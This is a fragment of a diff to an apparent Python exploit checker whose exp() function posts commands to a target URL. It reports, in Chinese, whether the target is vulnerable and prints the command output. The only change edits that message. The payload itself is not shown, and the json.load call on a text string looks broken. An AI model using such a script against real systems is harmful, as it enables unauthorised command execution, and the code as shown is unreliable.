@@ -24,7 +24,7 @@ def exp(url,cmd,username,password):
 		requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 		response = requests.post(url=url,headers=headers,data=data,verify=False,timeout=3)
 		if "commandResult" in response.text and response.status_code == 200:
-			print("目标{}存在漏洞，执行id的命令响应为：{}".format(url,json.load(response.text)["commandResult"]))
+			print("目标{}存在漏洞，执行的命令响应为：{}".format(url,json.load(response.text)["commandResult"]))
 		else:
 			print("目标{}不存在漏洞".format(url))
 	except Exception as e :
